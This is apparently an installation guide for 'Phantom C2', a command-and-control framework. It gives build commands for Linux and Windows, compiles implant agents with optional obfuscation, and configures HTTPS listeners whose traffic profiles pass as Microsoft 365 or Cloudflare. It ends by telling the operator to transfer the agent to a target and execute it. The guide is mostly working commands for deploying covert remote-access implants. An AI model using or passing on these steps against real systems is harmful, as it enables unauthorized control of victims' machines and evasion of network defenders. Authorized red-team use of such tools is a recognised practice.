# Phantom C2 — Installation Guide

## Table of Contents

- [Linux Installation](#linux-installation)
- [Windows Installation](#windows-installation)
- [Post-Installation Setup](#post-installation-setup)
- [Troubleshooting](#troubleshooting)

---

## Linux Installation

### Ubuntu / Debian / Kali

```bash
# 1. Update packages
sudo apt update && sudo apt upgrade -y

# 2. Install Go
sudo apt install -y golang-go git make openssl

# 3. Verify Go (must be 1.22+)
go version
# If version is too old, install manually:
# wget https://go.dev/dl/go1.24.2.linux-amd64.tar.gz
# sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.2.linux-amd64.tar.gz
# echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
# source ~/.bashrc

# 4. Clone Phantom
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# 5. Install Go dependencies
go mod tidy

# 6. Generate RSA keys (required)
go run ./cmd/keygen -out configs/

# 7. Generate TLS certs (for HTTPS listeners)
bash scripts/generate_certs.sh

# 8. Install garble (optional, for obfuscated agents)
go install mvdan.cc/garble@latest

# 9. Build the server
make server

# 10. Run Phantom
./build/phantom-server --config configs/server.yaml
```

### Arch Linux

```bash
sudo pacman -S go git make openssl
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom
go mod tidy
go run ./cmd/keygen -out configs/
make server
./build/phantom-server --config configs/server.yaml
```

### Fedora / RHEL

```bash
sudo dnf install -y golang git make openssl
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom
go mod tidy
go run ./cmd/keygen -out configs/
make server
./build/phantom-server --config configs/server.yaml
```

---

## Windows Installation

### Using winget (Windows 10/11)

```powershell
# 1. Install Go and Git
winget install GoLang.Go
winget install Git.Git

# 2. RESTART your terminal (required for PATH updates)

# 3. Verify installations
go version
git --version

# 4. Clone Phantom
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# 5. Install dependencies
go mod tidy

# 6. Generate RSA keys
go run ./cmd/keygen -out configs/

# 7. Build the server
go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server

# 8. Run Phantom
.\build\phantom-server.exe --config configs\server.yaml
```

### Manual Install (without winget)

1. **Install Go**: Download from https://go.dev/dl/ → run `.msi` installer
2. **Install Git**: Download from https://git-scm.com/download/win → run installer
3. **Restart terminal** and follow steps 4-8 above

### Building Agents on Windows

```powershell
# Windows agent
$env:GOOS="windows"; $env:GOARCH="amd64"; $env:CGO_ENABLED="0"
go build -ldflags "-s -w -X 'github.com/phantom-c2/phantom/internal/implant.ListenerURL=https://YOUR-C2:443'" -o build\agents\agent.exe ./cmd/agent

# Linux agent (cross-compile from Windows)
$env:GOOS="linux"; $env:GOARCH="amd64"; $env:CGO_ENABLED="0"
go build -ldflags "-s -w -X 'github.com/phantom-c2/phantom/internal/implant.ListenerURL=https://YOUR-C2:443'" -o build\agents\agent ./cmd/agent
```

---

## Post-Installation Setup

### 1. Configure Listeners

Edit `configs/server.yaml` to set your listener addresses:

```yaml
listeners:
  - name: "main-https"
    type: "https"
    bind: "0.0.0.0:443"
    profile: "microsoft"      # Disguise as Microsoft 365 traffic
    tls_cert: "configs/server.crt"
    tls_key: "configs/server-tls.key"
```

### 2. Choose a Malleable Profile

Available in `configs/profiles/`:
- `default.yaml` — Generic API traffic
- `microsoft.yaml` — Microsoft 365/Azure themed
- `cloudflare.yaml` — Cloudflare Workers themed

### 3. Build Your First Agent

From the Phantom CLI:
```
phantom > generate exe https://YOUR-C2-IP:443
```

### 4. Deploy the Agent

Transfer the built agent to the target and execute it. Once running, it will appear in your `agents` list.

---

## Troubleshooting

### "go: command not found"
- Ensure Go is installed and in your PATH
- Linux: `export PATH=$PATH:/usr/local/go/bin`
- Windows: Restart your terminal after installing Go

### "make: command not found" (Windows)
- Use the `go build` commands directly instead of `make`
- Or install Make: `winget install GnuWin32.Make`

### "load private key: no such file"
- Run the keygen first: `go run ./cmd/keygen -out configs/`

### "bind: permission denied" on port 443
- Use `sudo` on Linux: `sudo ./build/phantom-server --config configs/server.yaml`
- Or use a non-privileged port (8443, 8080) in `server.yaml`

### Agent not connecting
- Verify the listener is running: `listeners` command in the CLI
- Check firewall rules allow the listener port
- Verify the agent was built with the correct `LISTENER_URL`
- Check if TLS certs are configured for HTTPS listeners
